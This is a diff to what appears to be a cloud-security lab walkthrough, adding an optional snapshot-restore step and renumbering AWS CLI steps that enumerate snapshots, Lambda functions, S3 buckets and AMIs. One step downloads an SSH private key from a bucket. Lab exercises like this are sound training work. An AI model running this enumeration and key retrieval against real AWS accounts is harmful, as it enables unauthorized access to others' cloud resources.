@@ -16,12 +16,17 @@
    aws --profile ls-user --region us-east-1 ec2 describe-snapshots --owner-ids self
    ```
 
-4. List available Lambda functions:
+   Optional: Attempt to restore the snapshot as the ls-user directly (Will not work)
+   ```
+   aws ec2 create-volume --snapshot-id <snapshot-id> --availability-zone <availability-zone>
+   ```
+   
+5. List available Lambda functions:
    ```
    aws --profile ls-user --region us-east-1 lambda list-functions
    ```
 
-5. List S3 buckets and their contents:
+6. List S3 buckets and their contents:
    ```
    aws --profile ls-user --region us-east-1 s3 ls
    ```
@@ -30,13 +35,13 @@
    aws --profile ls-user --region us-east-1 s3 ls s3://<bucket-name>
    ```
 
-6. Download the SSH key from the S3 bucket:
+7. Download the SSH key from the S3 bucket:
    ```
    aws --profile ls-user --region us-east-1 s3 cp s3://<bucket-name>/ssh_key.pem ./ssh_key.pem
    chmod 400 ssh_key.pem
    ```
 
-7. List AMIs:
+8. List AMIs:
 ```
 aws --profile ls-user --region us-east-1 ec2 describe-images --owners self
 ```
